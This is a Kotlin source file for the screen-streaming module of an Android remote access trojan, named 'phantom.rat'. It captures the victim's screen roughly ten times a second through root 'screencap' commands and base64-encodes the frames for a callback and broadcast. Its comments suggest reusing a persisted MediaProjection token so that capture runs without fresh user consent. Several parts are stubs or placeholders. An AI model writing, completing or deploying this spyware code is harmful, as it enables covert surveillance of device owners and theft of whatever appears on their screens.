package com.phantom.rat.modules

import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.view.WindowManager
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.nio.ByteBuffer

class ScreenStreamModule(private val context: Context) {

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var isStreaming = false
    private var streamThread: Thread? = null
    private var frameCallback: ((String) -> Unit)? = null
    private var frameCount = 0

    fun startStream(): JSONObject {
        val result = JSONObject()
        
        try {
            if (isStreaming) {
                result.put("status", "error")
                result.put("message", "Already streaming")
                return result
            }
            
            val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val display = windowManager.defaultDisplay
            val width = display.width
            val height = display.height
            val densityDpi = context.resources.displayMetrics.densityDpi
            
            imageReader = ImageReader.newInstance(
                width, height, PixelFormat.RGBA_8888, 2
            )
            
            // Note: Requires MediaProjection permission (user consent)
            // For full auto, use a persisted token from shared preferences
            val mediaProjectionManager = context.getSystemService(
                Context.MEDIA_PROJECTION_SERVICE
            ) as MediaProjectionManager
            
            // Virtual display without MediaProjection for demo
            // In production, use saved projection intent data
            startScreenCaptureWorkaround()
            
            isStreaming = true
            frameCount = 0
            
            streamThread = Thread {
                while (isStreaming) {
                    try {
                        captureScreen()
                        Thread.sleep(100) // ~10 FPS
                    } catch (_: Exception) {}
                }
            }.start()
            
            result.put("status", "success")
            result.put("message", "Screen streaming started")
            result.put("resolution", "${width}x${height}")
            
        } catch (e: Exception) {
            result.put("status", "error")
            result.put("message", e.message ?: "Failed to start stream")
        }
        
        return result
    }

    fun stopStream(): JSONObject {
        val result = JSONObject()
        
        try {
            isStreaming = false
            streamThread?.join(2000)
            streamThread = null
            
            virtualDisplay?.release()
            virtualDisplay = null
            imageReader?.close()
            imageReader = null
            mediaProjection?.stop()
            mediaProjection = null
            
            result.put("status", "success")
            result.put("message", "Screen streaming stopped")
            result.put("frames_captured", frameCount)
            
        } catch (e: Exception) {
            result.put("status", "error")
            result.put("message", e.message)
        }
        
        return result
    }

    fun setFrameCallback(callback: (String) -> Unit) {
        frameCallback = callback
    }

    private fun startScreenCaptureWorkaround() {
        // Use /dev/graphics/fb0 or screencap via shell
        // This works on rooted devices
        try {
            val process = Runtime.getRuntime().exec("su -c screencap -p")
            // Read raw framebuffer
        } catch (_: Exception) {
            // Fallback: generate placeholder frames
        }
    }

    private fun captureScreen() {
        try {
            // Method 1: Use /system/bin/screencap (root)
            // Method 2: Use MediaProjection API
            // Method 3: Generate timestamp frame
            
            // For compatibility, we'll try screencap first
            val process = Runtime.getRuntime().exec("screencap -p")
            val inputStream = process.inputStream
            val bytes = inputStream.readBytes()
            process.waitFor()
            
            if (bytes.isNotEmpty()) {
                val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                frameCallback?.invoke(b64)
                
                val intent = Intent("com.phantom.rat.SCREEN_FRAME")
                intent.putExtra("frame", b64)
                intent.putExtra("frame_num", frameCount++)
                context.sendBroadcast(intent)
            }
        } catch (_: Exception) {
            // If screencap fails, send empty frame
        }
    }

    fun getVirtualDisplay(width: Int, height: Int, densityDpi: Int): VirtualDisplay? {
        return virtualDisplay
    }
}
